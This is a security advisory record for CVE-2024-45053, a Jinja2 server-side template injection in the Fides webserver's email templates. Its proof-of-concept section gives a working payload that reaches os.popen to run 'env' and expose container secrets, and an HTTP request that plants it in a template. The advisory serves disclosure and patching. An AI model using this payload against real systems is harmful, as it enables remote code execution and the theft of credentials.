advisory_id: GHSA-c34r-238x-f7qx
datasource_id: github_osv_importer_v2/GHSA-c34r-238x-f7qx
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-c34r-238x-f7qx/GHSA-c34r-238x-f7qx.json
aliases:
  - CVE-2024-45053
summary: |
  Remote Code Execution Vulnerability via SSTI in Fides Webserver Jinja Email Templating Engine
  ### Summary
  The Email Templating feature uses Jinja2 without proper input sanitization or rendering environment restrictions, allowing for Server-Side Template Injection that grants Remote Code Execution to privileged users. A privileged user refers to an Admin UI user with the default `Owner` or `Contributor` role, who can escalate their access and execute code on the underlying Fides Webserver container where the Jinja template rendering function is executed.

  ### Details
  The application enables the creation of message templates that are sent via email to Fides Privacy Center users (data subjects) who raise privacy requests such as data subject access requests or consent management requests via the Privacy Center. These emails are triggered at various points in the request processing flow, for example when a request is denied or approved. The messages are defined using Jinja2 templates, allowing the use of statement and expression directives to craft more complex messages that include dynamic variables.

  It was discovered that the Jinja2 environment used to render the templates does not restrict the usage of common Python methods and objects, which permits an attacker to execute arbitrary code via Server-Side Template Injection. An attacker with the ability to modify email templates can inject malicious code, which is then executed when an email message is rendered and sent to the user.

  Admin UI users assigned the following default roles are permitted to modify email templates and are therefore able to exploit this vulnerability:
  - Owner
  - Contributor

  OAuth clients with the `messaging-template:update` scope are also authorized to use the `PUT /api/v1/messaging/templates/` Fides Webserver API endpoint and may also exploit this vulnerability.

  ### Impact
  This vulnerability allows an attacker with sufficient privileges (`Owner`, `Contributor`, `messaging-template:update`) to execute arbitrary code remotely (Remote Code Execution) and escalate their privileges to those of a user on the Fides Webserver container. This escalated access grants the attacker control of the Fides Webserver application, including unauthorized access to integrated resources such as the hosted database, hosted cache, integrated data stores, and integrated SaaS applications. Potential impacts range from denial of service to the exfiltration of sensitive data unavailable to the user prior to the escalation of access.

  ### Patches
  The vulnerability has been patched in Fides version `2.44.0`. Users are advised to upgrade to this version or later to secure their systems against this threat.

  ### Workarounds
  There are no workarounds.

  ### PoC
  The following payload, when injected into the email template, enables the execution of a command on the underlying system, revealing the content of environment variables:
  ```jinja
  Your privacy request has been denied.
  *bb*
  {% for s in ().__class__.__base__.__subclasses__() %}{% if "warning" in s.__name__ %}{{s()._module.__builtins__['__import__']('os').popen("env").read() }}{% endif %}
  {% endfor %}
  *aa*
  ```

  The following HTTP request to the Fides Webserver API can be used to update a privacy request denial email template:
  ```http
  PUT /api/v1/messaging/templates/autogenerated-mes_ce649254-a90b-4073-ae12-193650064220 HTTP/2
  Host: <redacted host>
  Cookie: _fbp=fb.1.17232<..REDACTED>_ga=GA1.1.263756963.1723471626
  Content-Length: 361
  Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
  Unescape-Safestr: true
  Sec-Ch-Ua-Mobile: ?0
  Authorization: Bearer eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU..<REDACTED>
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
  Content-Type: application/json
  Access-Control-Allow-Origin: *
  X-Fides-Source: fidesops-admin-ui
  Sec-Ch-Ua-Platform: "Linux"
  Accept: */*
  Origin: https://<redacted host>
  Sec-Fetch-Site: same-origin
  Sec-Fetch-Mode: cors
  Sec-Fetch-Dest: empty
  Referer: https://<redacted host>/messaging/autogenerated-mes_ce649254-a90b-4073-ae12-193650064220
  Accept-Encoding: gzip, deflate, br
  Accept-Language: en-US,en;q=0.9
  Priority: u=1, i

  {
      "is_enabled": true,
      "content":
      {
          "subject": "Your privacy request has been denied XXX",
          "body": "Your privacy request has been denied. \n*bb*\n{% for s in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in s.__name__ %}{{s()._module.__builtins__['__import__']('os').popen(\"env\").read() }}{% endif %}\n{% endfor %}\n*aa*\n**"
      },
      "properties":
      [
          "FDS-JICO87"
      ]
  }
  ```

  As a result, when a Privacy Center user submits a privacy request, such as to access their own data, and the request is rejected by a user of the privacy request management dashboard, the malicious template will be rendered, the code will be executed, and the content of the underlying container's environment variables will be included in the email the end-user receives.

  <img width="851" alt="rce-email" src="https://github.com/user-attachments/assets/97a395c6-b163-4656-b551-fe3dcd748813">
impacted_packages:
  - purl: pkg:pypi/ethyca-fides
    affected_versions: vers:pypi/>=2.19.0|<2.44.0
    fixed_versions: vers:pypi/2.44.0
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '9.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-c34r-238x-f7qx/GHSA-c34r-238x-f7qx.json
  - score: '8.6'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/09/GHSA-c34r-238x-f7qx/GHSA-c34r-238x-f7qx.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-1336
  - CWE-94
references:
  - url: https://github.com/ethyca/fides
    reference_type:
    reference_id:
  - url: https://github.com/ethyca/fides/commit/829cbd9cb5ef9c814fbac1ed6800e8d939d359c5
    reference_type:
    reference_id:
  - url: https://github.com/ethyca/fides/security/advisories/GHSA-c34r-238x-f7qx
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-45053
    reference_type:
    reference_id: CVE-2024-45053
